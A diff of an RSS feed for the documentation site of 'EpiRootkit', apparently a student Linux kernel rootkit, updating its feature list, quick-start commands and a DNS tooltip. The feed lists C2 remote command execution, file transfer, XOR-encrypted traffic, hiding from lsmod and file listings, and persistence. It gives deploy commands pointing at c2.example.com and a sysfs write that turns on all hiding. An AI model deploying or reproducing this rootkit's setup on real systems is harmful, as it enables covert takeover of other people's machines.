@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 01 Jun 2025 02:02:11 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 04 Jun 2025 21:01:05 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
 &lt;/ul>
@@ -39,6 +39,7 @@
 &lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
 &lt;li>&lt;strong>XOR Encryption&lt;/strong>: 32-byte key encryption for all C2 traffic&lt;/li>
+&lt;li>&lt;strong>Sysfs Interface&lt;/strong>: Linux-native configuration using octal permission system&lt;/li>
 &lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and files from directory listings&lt;/li>
 &lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
 &lt;/ul>
@@ -57,7 +58,7 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="d709c00" class="language-bash ">
+ &lt;pre id="c341f58" class="language-bash ">
  &lt;code># 1. Build and deploy with XOR encryption enabled
 cd rootkit &amp;amp;&amp;amp; make
 sudo ./deploy_rootkit.sh address=c2.example.com port=443
@@ -74,7 +75,11 @@ exec Client-1 whoami
 # Output: root
 
 status Client-1
-# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR&lt;/code>
+# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR
+
+# 4. Configure via sysfs (octal permissions style)
+sudo sh -c &amp;#39;echo 7 &amp;gt; /sys/kernel/epirootkit/hide&amp;#39; # Enable all hiding
+cat /sys/kernel/epirootkit/hide # Check: 7&lt;/code>
  &lt;/pre>
  &lt;/div>
 &lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
@@ -277,7 +282,7 @@ sudo insmod epirootkit.ko&lt;/code>
 &lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
-&lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space domain name resolution for flexible C2 connectivity&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
+&lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space DNS client for domain-based C2 communication&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
 &lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
 &lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
 &lt;li>&lt;strong>Enables XOR encryption&lt;/strong> for all C2 communication&lt;/li>
